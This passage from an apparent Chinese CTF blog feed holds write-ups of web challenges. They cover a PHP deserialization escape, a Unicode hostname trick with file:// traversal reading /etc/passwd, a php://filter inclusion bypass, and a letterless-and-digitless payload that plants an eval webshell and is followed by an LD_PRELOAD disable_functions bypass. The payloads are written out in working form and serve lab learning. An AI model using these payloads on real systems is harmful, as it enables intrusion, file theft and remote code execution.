&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;a:2:{s:8:&amp;#34;nickname&amp;#34;;s:5:&amp;#34;where&amp;#34;;s:5:&amp;#34;photo&amp;#34;;s:3:&amp;#34;233&amp;#34;;}&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;2333&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$s1&lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;profile&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;($s1);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果是&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;O&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;7&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;profile&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;{&lt;span style="color:#a6e22e"&gt;s&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;;&lt;span style="color:#a6e22e"&gt;s&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;56&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;a:2:{s:8:&amp;#34;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;nickname&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;;s:15:&amp;#34;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;where&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;;s:5:&amp;#34;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;photo&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;;s:3:&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;233&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;;}&amp;#34;&lt;/span&gt;;&lt;span style="color:#a6e22e"&gt;s&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;6&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;upload&amp;#34;&lt;/span&gt;;&lt;span style="color:#a6e22e"&gt;s&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;2333&amp;#34;&lt;/span&gt;;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这种格式的，假如我们的payload是修改上面的upload，在一个字符串总长度s如上面的56读取所有变长的hacker以后，到了我们的payload地方，正常把我们构造的upload读取为对象，而后面真正的upload字符串就被舍去了。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103923.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;报错是因为nickname我们传入的是数组形式的，源代码里直接对数组进行操作肯定是报错的，但是我们需要的只有photo正常即可，可以看到后面我们文件更新成功了。&lt;/p&gt;
&lt;p&gt;查看页面的图片内容&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103720.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;base64解码&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103747.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="suctf-2019pythonginx"&gt;[SUCTF 2019]Pythonginx
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310100334.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;整理一下源码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;getUrl&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; url &lt;span style="color:#f92672"&gt;=&lt;/span&gt; request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;url&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; parse&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urlparse(url)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;hostname
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; host &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;suctf.cc&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;我扌 your problem? 111&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; parts &lt;span style="color:#f92672"&gt;=&lt;/span&gt; list(urlsplit(url))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; parts[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; host &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;suctf.cc&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;我扌 your problem? 222 &amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; host
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; newhost &lt;span style="color:#f92672"&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; h &lt;span style="color:#f92672"&gt;in&lt;/span&gt; host&lt;span style="color:#f92672"&gt;.&lt;/span&gt;split(&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; newhost&lt;span style="color:#f92672"&gt;.&lt;/span&gt;append(h&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode(&lt;span style="color:#e6db74"&gt;&amp;#39;idna&amp;#39;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;decode(&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; parts[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;join(newhost)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#去掉 url 中的空格&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; finalUrl &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urlunsplit(parts)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;split(&lt;span style="color:#e6db74"&gt;&amp;#39; &amp;#39;&lt;/span&gt;)[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; parse&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urlparse(finalUrl)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;hostname
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; host &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;suctf.cc&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urlopen(finalUrl)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;我扌 your problem? 333&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;三个if都是判断&lt;code&gt;host == 'suctf.cc'&lt;/code&gt;，但是需要最后一个host判断成功才可以读取文件，读取文件应该使用的是php伪协议，但是前面的不会了，去看wp。大概看的意思还是用unicode欺骗，相关题目[[ASIS 2019]Unicorn shop](#[ASIS 2019]Unicorn shop)，使用unicode经过解析以后还是原来的字符，但是可以绕过判断&lt;code&gt;==&lt;/code&gt;，回过头来注意到了&lt;strong&gt;第二个&lt;/strong&gt;if中有&lt;code&gt;newhost.append(h.encode('idna').decode('utf-8'))&lt;/code&gt;进行了一波编码，那么问题就出在了这里。&lt;/p&gt;
&lt;p&gt;所以我们只需要找出随便一个host里字符的其他unicode值，这个值在经过编码以后还可以变成原来的字母。其他wp都找的是最后的字母&lt;code&gt;c&lt;/code&gt;，那么我就找第一个字母&lt;code&gt;s&lt;/code&gt;验证一下，贴一个unicode的网站：https://www.compart.com/en/unicode/U+0073，进入网站以后可以搜索，然后下面有相关的字符，&lt;strong&gt;需要多试几个&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310102326.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;我选出的是这个字符&lt;code&gt;𝐬&lt;/code&gt;，我们先使用url编码一下防止参数出现错误，尝试读一下passwd：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310102513.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;flag并不在其中，并且也不再根目录下，根据题目中有&lt;code&gt;nginx&lt;/code&gt;应该是一个指路的，去读一读nginx的配置文件。从师傅那学到的nginx配置文件所在位置，以后说不定自己也用得到：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;配置文件存放目录：/etc/nginx、/usr/local/nginx/conf/nginx.conf&lt;/p&gt;
&lt;p&gt;主配置文件：/etc/nginx/conf/nginx.conf&lt;/p&gt;
&lt;p&gt;管理脚本：/usr/lib64/systemd/system/nginx.service&lt;/p&gt;
&lt;p&gt;模块：/usr/lisb64/nginx/modules&lt;/p&gt;
&lt;p&gt;应用程序：/usr/sbin/nginx&lt;/p&gt;
&lt;p&gt;程序默认存放位置：/usr/share/nginx/html&lt;/p&gt;
&lt;p&gt;日志默认存放位置：/var/log/nginx&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;读配置文件&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/local/nginx/conf/nginx.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103257.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;读flag&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/fffffflag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103323.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;参考的博客链接：&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.xmsec.cc/suctf19-wp/" target="_blank" rel="noopener"
&gt;https://www.xmsec.cc/suctf19-wp/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://xz.aliyun.com/t/6042#toc-24" target="_blank" rel="noopener"
&gt;https://xz.aliyun.com/t/6042#toc-24&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener"
&gt;https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bsidescf-2020had-a-bad-day"&gt;[BSidesCF 2020]Had a bad day
&lt;/h1&gt;&lt;p&gt;看这个标题我推一下OWRLD ORDER的&lt;a class="link" href="https://www.bilibili.com/video/BV1Bb411K7Gd" target="_blank" rel="noopener"
&gt;Have a nice day&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;页面两个按钮，一个康狗狗照片，一个康猫猫照片，点按钮以后url就会改变为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-url" data-lang="url"&gt;/index.php?category=woofers
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;尝试输入flag会显示&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310175019.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;只能有&lt;code&gt;woofers&lt;/code&gt;和&lt;code&gt;meowers&lt;/code&gt;可以通过，尝试了下php的&lt;code&gt;filter&lt;/code&gt;伪协议读文件&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310175611.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;读出来了，但是解密以后狗狗和猫猫这两个网页没啥作用：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;center&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &amp;lt;&lt;span style="color:#f92672"&gt;h4&lt;/span&gt;&amp;gt; Woof! Woof! &amp;lt;/&lt;span style="color:#f92672"&gt;h4&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;/&lt;span style="color:#f92672"&gt;center&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;img&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;style&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;width:100%&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;src&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;img/dog/&amp;lt;?php echo rand(1,10)?&amp;gt;.jpg&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;多尝试以后发现可以读&lt;code&gt;index&lt;/code&gt;，下面是主要的源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;category&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($file)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;( &lt;span style="color:#a6e22e"&gt;strpos&lt;/span&gt;( $file, &lt;span style="color:#e6db74"&gt;&amp;#34;woofers&amp;#34;&lt;/span&gt; ) &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strpos&lt;/span&gt;( $file, &lt;span style="color:#e6db74"&gt;&amp;#34;meowers&amp;#34;&lt;/span&gt; ) &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strpos&lt;/span&gt;( $file, &lt;span style="color:#e6db74"&gt;&amp;#34;index&amp;#34;&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;include&lt;/span&gt; ($file &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Sorry, we currently only support woofers and meowers.&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到if判断中需要字符串包含&lt;code&gt;woofers&lt;/code&gt;、&lt;code&gt;meowers&lt;/code&gt;、&lt;code&gt;index&lt;/code&gt;，那么我们只需要在filter伪协议中插入字符串绕过判断即可。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;需要知道的&lt;/strong&gt;：filter可以设定一个或多个过滤器名称，以管道符&lt;code&gt;\&lt;/code&gt;分隔，所以构造payload：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/index.php?category=php://filter/meowers/convert.base64-encode/resource=flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;读出来以后解密即可获得flag&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310181106.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;搜索的时候学到了一个其他的截断&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;zip://test.zip#hello.html.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;代表当前目录下的test.zip压缩包里面的hello.html.php，于是包含成功。&lt;/p&gt;</description></item><item><title>极客大挑战 2019 RCE ME</title><link>https://www.braindance.top/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link><pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid><description>&lt;h1 id="极客大挑战-2019rce-me"&gt;[极客大挑战 2019]RCE ME
&lt;/h1&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
if(isset($_GET[&amp;#39;code&amp;#39;])){
$code=$_GET[&amp;#39;code&amp;#39;];
if(strlen($code)&amp;gt;40){
die(&amp;#34;This is too Long.&amp;#34;);
}
if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){
die(&amp;#34;NO.&amp;#34;);
}
@eval($code);
}
else{
highlight_file(__FILE__);
}
// ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分析一波，GET请求获得&lt;code&gt;code&lt;/code&gt;，想要通过的话需要绕过两个检测：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;payload长度小于40&lt;/li&gt;
&lt;li&gt;不能包含&lt;code&gt;a-z、A-Z、0-9&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener"
&gt;一些不包含数字和字母的webshell&lt;/a&gt;，这次摸到了相关文章：&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener"
&gt;无字母数字webshell之提高篇&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;url编码&lt;/code&gt;+&lt;code&gt;~&lt;/code&gt;取反构造不可见字符串，然后加上php7版本以后支持了使用：&lt;code&gt;($a)()&lt;/code&gt;这样的方法动态执行函数，所以我们可以构造payload：&lt;code&gt;assert(eval($_POST[‘a’]))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;先构造&lt;code&gt;assert&lt;/code&gt;：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;echo urlencode(~&amp;#39;assert&amp;#39;);
//结果：%9E%8C%8C%9A%8D%8B
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再构造&lt;code&gt;eval($_POST['a'])&lt;/code&gt;：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;);
//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完整payload：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的&lt;code&gt;~&lt;/code&gt;取反再获得真正的函数名。&lt;/p&gt;
&lt;p&gt;使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是&lt;code&gt;ELF&lt;/code&gt;是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回&lt;code&gt;ret=127&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201403.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;搜索了一波，原来是是&lt;strong&gt;disable_function&lt;/strong&gt;搞的鬼，这个表可以在phpinfo()中查看：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201821.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;因为&lt;code&gt;system&lt;/code&gt;、&lt;code&gt;exec&lt;/code&gt;、&lt;code&gt;shell_exec&lt;/code&gt;等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过&lt;strong&gt;disable_function&lt;/strong&gt;的方法，网上有很多其他方法，其中一个方法：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用环境变量LD_PRELOAD来绕过&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的&lt;/p&gt;
&lt;p&gt;LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;正好蚁剑的插件中就有一个名为：&lt;a class="link" href="https://github.com/Medicean/as_bypass_php_disable_functions" target="_blank" rel="noopener"
&gt;as_bypass_php_disable_functions&lt;/a&gt;的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234337.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的&lt;code&gt;/var/www/html&lt;/code&gt;目录是没有上传权限的，我右键以后发现能修改权限，改成0777：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204190508.png"
loading="lazy"
